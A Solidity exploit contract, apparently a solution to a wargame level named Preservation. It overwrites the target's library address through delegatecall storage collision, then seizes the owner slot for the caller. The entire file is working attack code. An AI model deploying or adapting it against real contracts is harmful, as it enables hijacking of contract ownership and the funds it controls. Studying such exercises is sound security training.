// SPDX-License-Identifier: Unlicense
pragma solidity 0.8.26;

import {Preservation} from "./Preservation.sol";

contract MaliciousPreservation {
    address timeZone1Library;
    bytes32 fullillSlot2;
    address owner;

    function attack(Preservation _target) external {
        _target.setFirstTime(uint256(uint160(address(this))));
        _target.setFirstTime(uint256(uint160(msg.sender)));
        if (_target.owner() != msg.sender) revert();
    }

    function setTime(uint256 _time) external {
        owner = address(uint160(_time));
    }
}